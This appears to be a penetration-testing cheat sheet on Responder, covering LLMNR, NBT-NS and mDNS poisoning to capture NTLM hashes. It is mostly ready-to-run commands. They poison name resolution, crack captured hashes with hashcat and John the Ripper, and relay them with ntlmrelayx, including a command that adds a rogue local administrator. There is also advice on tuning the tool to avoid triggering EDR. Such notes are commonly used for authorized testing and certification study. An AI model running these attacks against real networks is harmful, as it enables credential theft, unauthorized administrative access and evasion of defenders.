# Responder – LLMNR/NBT-NS/MDNS Poisoning & Credential Capture

!!! tip "Tip"
    Run `sudo responder -I tun0 -wrf` as soon as you have internal network access — it passively captures NTLMv2 hashes from any misconfigured name resolution. Crack with `hashcat -m 5600`. If SMB signing is disabled on targets, relay with `ntlmrelayx` instead of cracking.

---

## Protocol Overview

### LLMNR (Link-Local Multicast Name Resolution)

- Protocol: UDP/5355
    
- Purpose: Resolves local network hostnames when DNS fails.
    
- Exploitable: Yes. Windows systems fall back to LLMNR if DNS fails.
    

### NBT-NS (NetBIOS Name Service)

- Protocol: UDP/137
    
- Legacy protocol for name resolution (Windows pre-Win10).
    
- Highly vulnerable to spoofing.
    

### mDNS (Multicast DNS)

- Protocol: UDP/5353
    
- Used in macOS and IoT environments.
    
- Also spoofable via Responder.
    

When a system tries to access `\\UNRESOLVEDHOST`, it sends a broadcast like:

```
Who has UNRESOLVEDHOST?
```

Responder replies, "I do," causing the system to attempt SMB/HTTP auth to the attacker's IP.

---
## Running Responder

### Basic Usage

```bash
sudo responder -I tun0
```

- `-I tun0`: Interface to bind to
    
- `-v`: Verbose mode
    

### Recommended Usage

```bash
sudo responder -I tun0 -wrf
```

- `-w`: Answer WPAD (Web Proxy Auto-Discovery) requests
    
- `-r`: Respond to NetBIOS Name Service (NBT-NS) requests
    
- `-f`: Respond to File/SMB requests
    

### Logs and Hashes

Responder writes captured hashes to:

```bash
Responder/logs/<TARGET-IP>-SMB-NTLMv2-<timestamp>.txt
```

---

## Credential Capture (NTLM Hashes)

### NTLMv1/NTLMv2 Format Example:

```
USERNAME::DOMAIN:LMHASH:NTHASH:CHALLENGE:RESPONSE
```

Captured hashes can be:

- **Cracked** offline
    
- **Relayed** via `ntlmrelayx`
    
- **Injected** with tools like `pth-winexe`, `pth-smbclient`, etc.
    

---

## Cracking NTLM Hashes

### With Hashcat (NTLMv2 – Mode 5600)

```bash
hashcat -m 5600 responder_hash.txt /usr/share/wordlists/rockyou.txt
```

### With John the Ripper

```bash
john --format=netntlmv2 responder_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Extract Only the Hash

```bash
cut -d ' ' -f 3 responder.log > responder_hashes.txt
```

---

## NTLM Relay Attacks (ntlmrelayx)

Responder can be paired with **Impacket's ntlmrelayx** to **authenticate to other services** instead of cracking hashes.

### Disable SMB in Responder to Avoid Collision

```bash
sudo responder -I tun0 -wrf --disable-smb
```

### Start ntlmrelayx

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

#### Example `targets.txt`:

```
smb://192.168.1.10
ldap://192.168.1.20
```

### Relay to SMB, Add Admin User

```bash
sudo ntlmrelayx.py -tf targets.txt --no-smb-signing --add-user attacker --passwd 'P@ssw0rd123' --group 'Administrators'
```

#### Supported Relay Targets:

| Protocol | Actions Available                                  |
| -------- | -------------------------------------------------- |
| SMB      | File access, command exec, add user                |
| LDAP     | Dump domain info, modify AD objects                |
| HTTP     | Limited use; enumerate or exploit upload endpoints |
| MSSQL    | Run SQL queries as authenticated user              |

---

## Advanced Configuration

Disable specific protocols in `Responder.conf`:

```bash
sudo mousepad /etc/responder/Responder.conf
```

```ini
[Responder Core]
SMB = Off
HTTP = On
FTP = Off
DNS = Off
```

Enable only what you need to avoid DoSing targets or triggering EDR.
